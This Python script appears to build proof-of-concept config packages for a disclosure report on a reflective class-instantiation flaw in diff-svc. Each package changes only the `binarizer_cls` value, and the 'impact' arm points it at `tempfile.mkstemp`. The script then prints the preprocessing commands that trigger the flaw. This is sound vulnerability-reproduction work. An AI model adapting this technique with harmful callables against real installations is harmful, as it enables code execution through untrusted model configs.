#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
make_poc.py - build the data-only model-project packages used to reproduce the
reflective-instantiation flaw of prophesier/diff-svc @ 236de777.

What it produces under  %TEMP%\\poc-work\\diff-svc-236de77-cve-report :

    <the pinned product checkout, copied from poc/source/diff-svc-236de77/>
    model_pkg_positive/config.yaml     binarizer_cls: network.vocoders.pwg.PWG
    model_pkg_negative/config.yaml     binarizer_cls: preprocessing.SVCpre.SVCBinarizer
    model_pkg_arbitrary/config.yaml    binarizer_cls: json.decoder.JSONDecodeError
    model_pkg_impact/config.yaml       binarizer_cls: tempfile.mkstemp

Every package holds exactly ONE data file (config.yaml) and NO .py / native
sidecar.  The only difference between the four packages is the value of the
single leaf `binarizer_cls:`; every other line is byte-identical to the
product's own documented project config (training/config.yaml), i.e. the rest
of the project configuration is kept "same shape" on purpose.
"""

import hashlib
import shutil
import tempfile
from pathlib import Path

POC_DIR = Path(__file__).resolve().parent
SOURCE = POC_DIR / "source" / "diff-svc-236de77"
PIN = "236de77779755196e39034eec1f2a2500968aa52"

WORK = Path(tempfile.gettempdir()) / "poc-work" / "diff-svc-236de77-cve-report"

LEAF = "binarizer_cls"
BASE_VALUE = "preprocessing.SVCpre.SVCBinarizer"          # the product's own documented value
BASE_LINE = "%s: %s" % (LEAF, BASE_VALUE)

ARMS = [
    ("model_pkg_positive", "network.vocoders.pwg.PWG",
     "a class that already exists in the victim product environment"),
    ("model_pkg_negative", BASE_VALUE,
     "the product's own documented value (official negative control)"),
    ("model_pkg_arbitrary", "json.decoder.JSONDecodeError",
     "a standard-library class (arbitrary-class control)"),
    ("model_pkg_impact", "tempfile.mkstemp",
     "a standard-library callable whose no-argument call creates a real file"),
]


def sha256(path):
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def main():
    if not SOURCE.is_dir():
        raise SystemExit("pinned source not found: %s" % SOURCE)

    if WORK.exists():
        shutil.rmtree(WORK)
    WORK.parent.mkdir(parents=True, exist_ok=True)
    shutil.copytree(SOURCE, WORK)

    base_config = WORK / "training" / "config.yaml"
    base_text = base_config.read_text(encoding="utf-8")
    if base_text.count(BASE_LINE) != 1:
        raise SystemExit("expected exactly one '%s' line in %s" % (BASE_LINE, base_config))

    print("[*] work dir      : %s" % WORK)
    print("[*] victim product: prophesier/diff-svc pinned at %s" % PIN)
    print("[*] base config   : training\\config.yaml (the product's own documented project config)")
    print("")

    for arm, value, why in ARMS:
        new_line = "%s: %s" % (LEAF, value)
        payload = base_text.replace(BASE_LINE, new_line, 1)
        for arm_dir in (WORK / arm, POC_DIR / arm):
            arm_dir.mkdir(parents=True, exist_ok=True)
            (arm_dir / "config.yaml").write_text(payload, encoding="utf-8")

    print("single-leaf diff - this one line is the entire difference between the packages:")
    print("")
    print("  (product)  %s" % BASE_LINE)
    print("")
    for arm, value, why in ARMS:
        print("  %-18s  %s: %s" % (arm, LEAF, value))
    print("")
    print("  arms: positive = a class of the victim product environment;")
    print("        negative = the product's own documented value (official negative control);")
    print("        arbitrary = a standard-library class (arbitrary-class control);")
    print("        impact = a standard-library callable whose no-argument call creates a real file.")
    print("")

    print("package content (data only - no .py, no native sidecar):")
    for arm, _value, _why in ARMS:
        files = sorted(p for p in (WORK / arm).rglob("*") if p.is_file())
        listing = ", ".join("%s (%d bytes)" % (p.name, p.stat().st_size) for p in files)
        print("  %-18s %d file(s): %s" % (arm, len(files), listing))
    print("")

    print("SHA-256 of the carrier configs:")
    lines = []
    for arm, value, why in ARMS:
        digest = sha256(WORK / arm / "config.yaml")
        lines.append("%s  %s/config.yaml" % (digest, arm))
        print("  %s  %s/config.yaml" % (digest, arm))
    print("")

    print("[*] next, run the product's documented preprocessing CLI from %s :" % WORK)
    print('    $env:PYTHONPATH = "."')
    print('    python preprocessing\\binarize.py --config model_pkg_positive\\config.yaml')
    print('    python preprocessing\\binarize.py --config model_pkg_negative\\config.yaml')
    print('    python preprocessing\\binarize.py --config model_pkg_arbitrary\\config.yaml')
    print('    python preprocessing\\binarize.py --config model_pkg_impact\\config.yaml')
    print("    (PYTHONPATH points at the checkout root, exactly as the project README")
    print("     documents it with `export PYTHONPATH=.`; use the reproduction venv)")
    print("")

    sums = POC_DIR / "SHA256SUMS.txt"
    sums.write_text("\n".join(lines) + "\n", encoding="utf-8")
    print("[*] an identical copy of each package also sits in this poc\\ directory")
    print("[*] wrote %s" % sums)


if __name__ == "__main__":
    main()
